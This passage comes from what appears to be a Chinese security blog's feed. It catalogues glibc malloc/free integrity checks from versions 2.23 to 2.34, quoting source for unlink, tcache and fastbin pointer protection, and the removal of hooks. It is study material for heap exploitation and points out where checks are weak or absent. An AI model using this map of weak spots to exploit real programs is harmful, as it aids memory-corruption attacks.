class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">unlink_chunk</span> <span class="params">(mstate av, mchunkptr p)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (chunksize (p) != prev_size (next_chunk (p)))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);</span><br><span class="line"></span><br><span class="line">  mchunkptr fd = p-&gt;fd;</span><br><span class="line">  mchunkptr bk = p-&gt;bk;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, <span class="number">0</span>))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted double-linked list&quot;</span>);</span><br><span class="line"></span><br><span class="line">  fd-&gt;bk = bk;</span><br><span class="line">  bk-&gt;fd = fd;</span><br><span class="line">  <span class="keyword">if</span> (!in_smallbin_range (chunksize_nomask (p)) &amp;&amp; p-&gt;fd_nextsize != <span class="literal">NULL</span>)<span class="comment">//fd_nextsize为null那么其本身就不在nextsize链</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (p-&gt;fd_nextsize-&gt;bk_nextsize != p</span><br><span class="line">  || p-&gt;bk_nextsize-&gt;fd_nextsize != p)</span><br><span class="line">malloc_printerr (<span class="string">&quot;corrupted double-linked list (not small)&quot;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (fd-&gt;fd_nextsize == <span class="literal">NULL</span>)<span class="comment">//fd为bin头的时候也不会进入,其实这种情况应该怎么也不会出现的,p在nextsize链上出现,p-&gt;fd任何情况也不会为null,****所以这部分代码的作用应该是防止修改bin头</span></span><br><span class="line"><span class="comment">//前提是确实不会有:在拥有相同大小chunk的情况下去分配nextsize链上的chunk的情况</span></span><br><span class="line">      &#123;</span><br><span class="line">  <span class="keyword">if</span> (p-&gt;fd_nextsize == p)<span class="comment">//nextsize链上只有p(其实整个链也只有p)</span></span><br><span class="line">    fd-&gt;fd_nextsize = fd-&gt;bk_nextsize = fd;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      fd-&gt;fd_nextsize = p-&gt;fd_nextsize;</span><br><span class="line">      fd-&gt;bk_nextsize = p-&gt;bk_nextsize;</span><br><span class="line">      p-&gt;fd_nextsize-&gt;bk_nextsize = fd;</span><br><span class="line">      p-&gt;bk_nextsize-&gt;fd_nextsize = fd;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  p-&gt;fd_nextsize-&gt;bk_nextsize = p-&gt;bk_nextsize;</span><br><span class="line">  p-&gt;bk_nextsize-&gt;fd_nextsize = p-&gt;fd_nextsize;<span class="comment">//这样指向不会修改到bin头</span></span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="glibc2-31"><a href="#glibc2-31" class="headerlink" title="glibc2.31"></a>glibc2.31</h1><h1 id="glibc2-32"><a href="#glibc2-32" class="headerlink" title="glibc2.32"></a>glibc2.32</h1><h2 id="tcache加密"><a href="#tcache加密" class="headerlink" title="tcache加密"></a>tcache加密</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PROTECT_PTR(pos, ptr) \</span></span><br><span class="line"><span class="meta">  ((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)</span></span><br></pre></td></tr></table></figure><p>新增了这两个宏用于加密</p><p><strong>这个加密是半可逆的,再执行一遍可以恢复ptr的值，但无法恢复原始的pos的值。</strong></p><p>在tcache_put中进行加密</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">tcache_put (mchunkptr chunk, <span class="type">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span></span><br><span class="line"><span class="comment">     detect a double free.  */</span></span><br><span class="line">  e-&gt;key = tcache;</span><br><span class="line"></span><br><span class="line">  e-&gt;next = PROTECT_PTR (&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到第一个chunk是没有加密的</p><h2 id="fastbin加密"><a href="#fastbin加密" class="headerlink" title="fastbin加密"></a>fastbin加密</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PROTECT_PTR(pos, ptr) \</span></span><br><span class="line"><span class="meta">  ((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)</span></span><br></pre></td></tr></table></figure><p>一样的加密,也同样第一个chunk没有加密</p><h1 id="glibc2-33"><a href="#glibc2-33" class="headerlink" title="glibc2.33"></a>glibc2.33</h1><p>无明显变化</p><h1 id="glibc2-34"><a href="#glibc2-34" class="headerlink" title="glibc2.34"></a>glibc2.34</h1><h2 id="取消hook"><a href="#取消hook" class="headerlink" title="取消hook"></a>取消hook</h2><p>__malloc_hook,__free_hook等一系列hook函数全部被ban了</p><p>libc_malloc,libc_free中不再调用hook</p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> glibc </tag>
            
            <tag> 堆 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>malloc/free安全检查</title>
      <link href="/posts/25293/"/>
      <url>/posts/25293/</url>
      
        <content type="html"><![CDATA[<span class='p black'>在不同的glibc下</span><p>分为两篇,一篇记录安全检测,一篇记录操作变化</p><p><strong>需要注意,一个大版本下的libc还有许多小版本,版本不同libc也会存在差异,可能有些有检查有些没有</strong></p><p>这里以<a href="http://mirrors.nju.edu.cn/gnu/libc/">libc下载</a>网站下载的为准</p><h1 id="glibc2-23"><a href="#glibc2-23" class="headerlink" title="glibc2.23"></a>glibc2.23</h1><p><strong>现在看来,2.23已经是一个比较老的版本了,比它更早的版本暂时不做关注,2.23是一个十分经典的版本,以它为基础先概览各类检查</strong></p><h2 id="malloc-realloc"><a href="#malloc-realloc" class="headerlink" title="malloc(realloc)"></a>malloc(realloc)</h2><h3 id="fastbin"><a href="#fastbin" class="headerlink" title="fastbin"></a>fastbin</h3><p><strong>size检查fastbin01</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (fastbin_index (chunksize (victim)) != idx, <span class="number">0</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    errstr = <span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>;</span><br><span class="line">  errout:</span><br><span class="line">    malloc_printerr (check_action, errstr, chunk2mem (victim), av);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>取出fastbin时,通过该chunk计算出的fastbin索引是否与该chunk所在的链的索引相同,即大小是否对应</p><h3 id="unsortedbin"><a href="#unsortedbin" class="headerlink" title="unsortedbin"></a>unsortedbin</h3><h4 id="size检查unsortedbin01"><a href="#size检查unsortedbin01" class="headerlink" title="size检查unsortedbin01"></a>size检查unsortedbin01</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">    || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">  malloc_printerr (check_action, <span class="string">&quot;malloc(): memory corruption&quot;</span>,</span><br><span class="line">                   chunk2mem (victim), av);</span><br></pre></td></tr></table></figure><p>检查从unsortedbin中取出的chunk的size是否合规</p><h3 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h3><h4 id="完整性检查unlink01"><a href="#完整性检查unlink01" class="headerlink" title="完整性检查unlink01"></a><strong>完整性检查unlink01</strong></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))      \</span><br><span class="line">  malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);</span><br></pre></td></tr></table></figure><p>操作chunk的上一个的下一个和下一个的上一个是否都等于该chunk</p><h4 id="完整性检查-largebin-unlink02"><a href="#完整性检查-largebin-unlink02" class="headerlink" title="完整性检查(largebin)unlink02"></a>完整性检查(largebin)unlink02</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)      \</span><br><span class="line">|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))    \</span><br><span class="line">     malloc_printerr (check_action,      \</span><br><span class="line">       <span class="string">&quot;corrupted double-linked list (not small)&quot;</span>,    \</span><br><span class="line">       P, AV);</span><br></pre></td></tr></table></figure><p>和unlink01类似,不过检查的是largebin的nextsize链</p><h3 id="realloc"><a href="#realloc" class="headerlink" title="realloc"></a>realloc</h3><h4 id="realloc01"><a href="#realloc01" class="headerlink" title="realloc01"></a>realloc01</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect ((<span class="type">uintptr_t</span>) oldp &gt; (<span class="type">uintptr_t</span>) -oldsize, <span class="number">0</span>)</span><br><span class="line">    || __builtin_expect (misaligned_chunk (oldp), <span class="number">0</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    malloc_printerr (check_action, <span class="string">&quot;realloc(): invalid pointer&quot;</span>, oldmem,</span><br><span class="line">       ar_ptr);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><ol><li><code>(uintptr_t) oldp &gt; (uintptr_t) -oldsize</code>：这部分代码检查<code>oldp</code>指针是否在有效范围内。它将<code>oldp</code>指针强制转换为无符号整数类型（<code>uintptr_t</code>），然后与<code>-oldsize</code>的负值的二进制补码表示进行比较。这个比较用于检测<code>oldp</code>指针是否在或接近最大可能地址，这可能表明该指针是无效的或者存在损坏。</li><li><code>(misaligned_chunk (oldp)</code>原指针是否对齐</li></ol><h4 id="realloc02"><a href="#realloc02" class="headerlink" title="realloc02"></a>realloc02</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (oldp-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">    || __builtin_expect (oldsize &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    errstr = <span class="string">&quot;realloc(): invalid old size&quot;</span>;</span><br><span class="line">  errout:</span><br><span class="line">    malloc_printerr (check_action, errstr, chunk2mem (oldp), av);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>检查原来的chunk的size是否合规</p><h3 id="sysmalloc"><a href="#sysmalloc" class="headerlink" title="sysmalloc"></a>sysmalloc</h3><h4 id="sysmalloc01"><a href="#sysmalloc01" class="headerlink" title="sysmalloc01"></a>sysmalloc01</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (contiguous (av) &amp;&amp; old_size &amp;&amp; brk &lt; old_end)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">/* Oops!  Someone else killed our space..  Can&#x27;t touch anything.  */</span></span><br><span class="line">    malloc_printerr (<span class="number">3</span>, <span class="string">&quot;break adjusted to free malloc space&quot;</span>, brk,</span><br><span class="line">av);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>暂时未知</p><h3 id="munmap-chunk"><a href="#munmap-chunk" class="headerlink" title="munmap_chunk"></a>munmap_chunk</h3><h4 id="munmap-chunk01"><a href="#munmap-chunk01" class="headerlink" title="munmap_chunk01"></a>munmap_chunk01</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (((block | total_size) &amp; (GLRO (dl_pagesize) - <span class="number">1</span>)) != <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    malloc_printerr (check_action, <span class="string">&quot;munmap_chunk(): invalid pointer&quot;</span>,</span><br><span class="line">                     chunk2mem (p), <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>暂时未知</p><h3 id="返回后-libc-malloc检查"><a href="#返回后-libc-malloc检查" class="headerlink" title="返回后_libc_malloc检查"></a>返回后_libc_malloc检查</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">        ar_ptr == arena_for_chunk (mem2chunk (victim)));</span><br></pre></td></tr></table></figure><p>libc这里还有一个检查</p><p>需要至少满足一个,正常情况不会被这个检查卡住</p><pre><code>1. victim 为 02. IS_MMAPPED 为 13. NON_MAIN_ARENA 为 0</code></pre><h2 id="free"><a href="#free" class="headerlink" title="free"></a>free</h2><h3 id="free01"><a href="#free01" class="headerlink" title="free01"></a>free01</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect ((<span class="type">uintptr_t</span>) p &gt; (<span class="type">uintptr_t</span>) -size, <span class="number">0</span>)</span><br><span class="line">    || __builtin_expect (misaligned_chunk (p), <span class="number">0</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    errstr = <span class="string">&quot;free(): invalid pointer&quot;</span>;</span><br><span class="line">  errout:</span><br><span class="line">    <span class="keyword">if</span> (!have_lock &amp;&amp; locked)</span><br><span class="line">      (<span class="type">void</span>) mutex_unlock (&amp;av-&gt;mutex);</span><br><span class="line">    malloc_printerr (check_action, errstr, chunk2mem (p), av);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>free的chunk的地址是否合规,是否对齐</p><h3 id="free02"><a href="#free02" class="headerlink" title="free02"></a>free02</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size)))</span><br><span class="line">  &#123;</span><br><span class="line">    errstr = <span class="string">&quot;free(): invalid size&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>free的chunk的size是否合规对齐</p><h3 id="free03-fastbin"><a href="#free03-fastbin" class="headerlink" title="free03(fastbin)"></a>free03(fastbin)</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (have_lock</span><br><span class="line">    || (&#123; assert (locked == <span class="number">0</span>);</span><br><span class="line">  mutex_lock(&amp;av-&gt;mutex);</span><br><span class="line">  locked = <span class="number">1</span>;</span><br><span class="line">  chunk_at_offset (p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ</span><br><span class="line">    || chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem;</span><br><span class="line">      &#125;))</span><br><span class="line">  &#123;</span><br><span class="line">    errstr = <span class="string">&quot;free(): invalid next size (fast)&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>free的chunk的下一个chunk的size是否合规</p><h3 id="free04-fastbin"><a href="#free04-fastbin" class="headerlink" title="free04(fastbin)"></a>free04(fastbin)</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    errstr = <span class="string">&quot;double free or corruption (fasttop)&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>上一次free的chunk与这一次的是否相同,即是否double free</p><h3 id="free05-fastbin"><a href="#free05-fastbin" class="headerlink" title="free05(fastbin)"></a>free05(fastbin)</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span> &amp;&amp; __builtin_expect (old_idx != idx, <span class="number">0</span>))</span><br><span class="line">     &#123;</span><br><span class="line">errstr = <span class="string">&quot;invalid fastbin entry (free)&quot;</span>;</span><br><span class="line"><span class="keyword">goto</span> errout;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>Check that size of fastbin chunk at the top is the same as size of the chunk that we are adding</p><h3 id="free06"><a href="#free06" class="headerlink" title="free06"></a>free06</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">if</span> (__glibc_unlikely (p == av-&gt;top))</span><br><span class="line">     &#123;</span><br><span class="line">errstr = <span class="string">&quot;double free or corruption (top)&quot;</span>;</span><br><span class="line"><span class="keyword">goto</span> errout;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure><p>释放的chunk为topchunk</p><h3 id="free07"><a href="#free07" class="headerlink" title="free07"></a>free07</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">if</span> (__builtin_expect (contiguous (av)</span><br><span class="line">  &amp;&amp; (<span class="type">char</span> *) nextchunk</span><br><span class="line">  &gt;= ((<span class="type">char</span> *) av-&gt;top + chunksize(av-&gt;top)), <span class="number">0</span>))</span><br><span class="line">     &#123;</span><br><span class="line">errstr = <span class="string">&quot;double free or corruption (out)&quot;</span>;</span><br><span class="line"><span class="keyword">goto</span> errout;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure><p>下一个chunk是否超出堆的界限</p><h3 id="free08"><a href="#free08" class="headerlink" title="free08"></a>free08</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">if</span> (__glibc_unlikely (!prev_inuse(nextchunk)))</span><br><span class="line">     &#123;</span><br><span class="line">errstr = <span class="string">&quot;double free or corruption (!prev)&quot;</span>;</span><br><span class="line"><span class="keyword">goto</span> errout;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure><p>释放的chunk之前并不处于使用状态</p><h3 id="free09"><a href="#free09" class="headerlink" title="free09"></a>free09</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">if</span> (__builtin_expect (nextchunk-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">|| __builtin_expect (nextsize &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">     &#123;</span><br><span class="line">errstr = <span class="string">&quot;free(): invalid next size (normal)&quot;</span>;</span><br><span class="line"><span class="keyword">goto</span> errout;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure><p>nextchunk的size是否合规</p><h3 id="free10"><a href="#free10" class="headerlink" title="free10"></a>free10</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">     <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">&#123;</span><br><span class="line">  errstr = <span class="string">&quot;free(): corrupted unsorted chunks&quot;</span>;</span><br><span class="line">  <span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>unsortedbin链头是否完整,<strong>这个检查有三处:</strong></p><ol><li>是unsortedbin往外取切割检查</li><li>是unsortedbin处理后依然找不到在大chunk中切割时检查</li><li>是free时即将放入unsortedbin时存在一次检查</li></ol><h1 id="glibc2-27"><a href="#glibc2-27" class="headerlink" title="glibc2.27"></a>glibc2.27</h1><p>glibc2.23-2.27之间的版本比较少见,变化只看2.27与2.23比较,此外主要是在2.26加入了tcachebin</p><h2 id="malloc检查变化"><a href="#malloc检查变化" class="headerlink" title="malloc检查变化"></a>malloc检查变化</h2><h3 id="unlink增加一个检查unlink03"><a href="#unlink增加一个检查unlink03" class="headerlink" title="unlink增加一个检查unlink03"></a>unlink增加一个检查unlink03</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))      \</span><br><span class="line">  malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>); </span><br></pre></td></tr></table></figure><p>检查通过该chunk的size找到的nextchunk的prev_size是否等于该chunk的size,unlink不会检查通过prev_size找到的该chunk的size是否等于那个prev_size</p><h3 id="取出smallbin新增一个检查"><a href="#取出smallbin新增一个检查" class="headerlink" title="取出smallbin新增一个检查"></a>取出smallbin新增一个检查</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">   malloc_printerr (<span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>);</span><br></pre></td></tr></table></figure><p>检查smallbin链表尾是否完整</p><h3 id="malloc-consolidate新增检查"><a href="#malloc-consolidate新增检查" class="headerlink" title="malloc_consolidate新增检查"></a>malloc_consolidate新增检查</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> maxfb = &amp;fastbin (av, NFASTBINS - <span class="number">1</span>);</span><br><span class="line"> fb = &amp;fastbin (av, <span class="number">0</span>);</span><br><span class="line"> <span class="keyword">do</span> &#123;</span><br><span class="line">   p = atomic_exchange_acq (fb, <span class="literal">NULL</span>);<span class="comment">//将fastbinsY[0]的值存储在p中然后清空</span></span><br><span class="line">   <span class="keyword">if</span> (p != <span class="number">0</span>) &#123;<span class="comment">//p不为0,那么就说明存在chunk</span></span><br><span class="line">     <span class="keyword">do</span> &#123;</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> idx = fastbin_index (chunksize (p));</span><br><span class="line">  <span class="keyword">if</span> ((&amp;fastbin (av, idx)) != fb)</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc_consolidate(): invalid chunk size&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>检查p指向chunk索引对应的fastbin链表头部指针是否等于fb。如果不相等，说明fastbin链表的头部指针被修改了，这可能表明发生了错误或者内存数据结构遭到破坏。</p><p>其实就是检查idx是不是等于0</p><h3 id="新增宏REMOVE-FB-删除fastbin-chunk-索引检测"><a href="#新增宏REMOVE-FB-删除fastbin-chunk-索引检测" class="headerlink" title="新增宏REMOVE_FB(删除fastbin_chunk)索引检测"></a>新增宏REMOVE_FB(删除fastbin_chunk)索引检测</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (victim_idx != idx, <span class="number">0</span>))</span><br><span class="line">malloc_printerr (<span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>);</span><br></pre></td></tr></table></figure><p>移除fastbin_chunk的时候,检测victim的size计算出的idx与该所在链的索引是否相等</p><h2 id="free检查变化"><a href="#free检查变化" class="headerlink" title="free检查变化"></a>free检查变化</h2><p>free似乎没有什么变化,新加入的tcache十分脆弱,几乎没有任何检查</p><h1 id="glibc2-29"><a href="#glibc2-29" class="headerlink" title="glibc2.29"></a>glibc2.29</h1><h2 id="malloc变化"><a href="#malloc变化" class="headerlink" title="malloc变化"></a>malloc变化</h2><h3 id="unsortedbin取出检查较大变化"><a href="#unsortedbin取出检查较大变化" class="headerlink" title="unsortedbin取出检查较大变化"></a>unsortedbin取出检查较大变化</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (size &lt;= <span class="number">2</span> * SIZE_SZ)</span><br><span class="line">    || __glibc_unlikely (size &gt; av-&gt;system_mem))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): invalid size (unsorted)&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (chunksize_nomask (next) &lt; <span class="number">2</span> * SIZE_SZ)</span><br><span class="line">    || __glibc_unlikely (chunksize_nomask (next) &gt; av-&gt;system_mem))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): invalid next size (unsorted)&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely ((prev_size (next) &amp; ~(SIZE_BITS)) != size))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): mismatching next-&gt;prev_size (unsorted)&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd 